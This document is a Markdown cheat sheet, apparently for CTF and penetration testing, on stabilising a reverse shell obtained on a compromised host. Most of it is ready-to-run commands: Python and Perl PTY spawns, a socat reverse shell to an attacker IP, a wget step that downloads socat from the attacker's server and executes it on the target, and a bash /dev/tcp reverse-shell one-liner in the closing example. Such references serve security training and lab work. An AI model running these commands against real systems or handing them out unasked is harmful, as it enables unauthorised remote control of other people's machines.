# Shell Stabilization Cheat Sheet

## Quick Reference — Python PTY (Most Common)

```bash
# 1. Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background the shell
Ctrl+Z

# 3. Fix local terminal (disables echo, passes raw input)
stty raw -echo; fg

# 4. Fix environment
export TERM=xterm-256color
export SHELL=/bin/bash

# 5. Fix terminal size (run `stty size` on YOUR machine first)
stty rows 50 cols 220
```

---

## Method 1: Python PTY

```bash
# Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# Try sh if bash not available
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

---

## Method 2: script

```bash
script /dev/null -c bash

# Older systems
script -q /dev/null
```

---

## Method 3: socat (Best Quality — Full TTY)

**On your machine (listener):**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On target:**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR_IP>:4444
```

**Upload socat if not installed:**
```bash
# On your machine — serve it
python3 -m http.server 8080

# On target — download it
wget http://<YOUR_IP>:8080/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR_IP>:4444
```

---

## Method 4: rlwrap (Quick & Dirty)

Adds arrow keys, history, and tab completion to a raw nc shell.

```bash
# On your machine — wrap the listener
rlwrap nc -lvnp 4444
```

---

## Method 5: Perl

```bash
perl -e 'exec "/bin/bash";'

# With PTY
perl -MIO::Pty -e '$p=new IO::Pty; exec "/bin/bash"'
```

---

## Method 6: Ruby

```bash
ruby -e 'exec "/bin/bash"'
```

---

## Method 7: Expect

```bash
expect -c 'spawn bash; interact'
```

---

## Fix Terminal Size

Run on **your machine** to get current size:
```bash
stty size         # outputs: rows cols  e.g. "50 220"
tput lines        # rows only
tput cols         # cols only
```

Apply inside the stabilized shell:
```bash
stty rows 50 cols 220
```

---

## Upgrade to Bash if Dropped to sh

```bash
/bin/bash
bash -i
```

---

## Check What's Available on Target

```bash
which python python3 perl ruby socat script expect 2>/dev/null
```

---

## Common Issues & Fixes

| Problem | Fix |
|---------|-----|
| No arrow keys / history | Use rlwrap or full PTY method |
| `TERM not set` errors | `export TERM=xterm-256color` |
| Ctrl+C kills shell | Must stabilize first — use PTY method |
| No python on target | Try `script`, `socat`, or `perl` |
| Terminal garbled after `stty raw` | Type `reset` blindly and press Enter |
| Tab completion broken | `export TERM=xterm` then `Ctrl+L` |
| sudo not working | `-S` flag: `echo 'password' \| sudo -S command` |

---

## One-Liner Decision Tree

```
Got a shell?
├── python3 available?  → Python PTY method (Method 1)
├── socat available?    → socat method (Method 3) — best quality
├── script available?  → script /dev/null -c bash (Method 2)
├── perl available?    → Perl method (Method 5)
└── nothing available? → rlwrap on your listener (Method 4)
```

---

## Full Flow Example (CTF/Pentest)

```bash
# --- On your machine ---
rlwrap nc -lvnp 4444          # start listener

# --- Trigger reverse shell on target ---
# e.g. bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1

# --- Inside the raw shell ---
which python3                  # confirm python3 exists
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z                         # background
stty raw -echo; fg             # fix local terminal
export TERM=xterm-256color     # fix TERM
stty rows 50 cols 220          # fix size
```
